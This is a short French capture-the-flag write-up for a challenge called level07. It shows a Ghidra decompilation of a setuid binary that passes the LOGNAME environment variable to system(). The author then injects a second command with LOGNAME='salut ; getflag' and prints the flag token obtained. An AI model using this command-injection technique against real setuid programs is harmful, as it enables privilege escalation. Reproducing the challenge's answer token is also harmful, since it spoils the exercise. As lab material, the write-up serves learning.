quand on ouvre le binaire dans ghidra:
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
                    /* Unresolved local var: char * buffer@[DW_OP_breg4(ESP): +20]
                       Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
                       Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28] */
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}

on s'aperçoit que il recupère une variable d'env nommée LOGNAME. Avec cette information on peut donc faire une injection de commande comme celà:
export LOGNAME="salut ; getflag"

et quand on execute:
./level07 
salut
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h